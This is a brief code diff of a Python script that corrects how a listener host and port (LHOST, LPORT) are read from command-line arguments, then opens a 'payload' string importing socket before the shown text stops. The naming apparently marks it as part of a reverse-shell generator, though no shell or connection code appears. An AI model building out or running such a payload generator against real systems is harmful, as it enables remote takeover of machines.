@@ -1,8 +1,8 @@
 import sys
 import os
 
-LHOST = sys.argv[0]
-LPORT = int(sys.argv[1])
+LHOST = sys.argv[1]
+LPORT = int(sys.argv[2])
 
 payload = f"""
 import socket
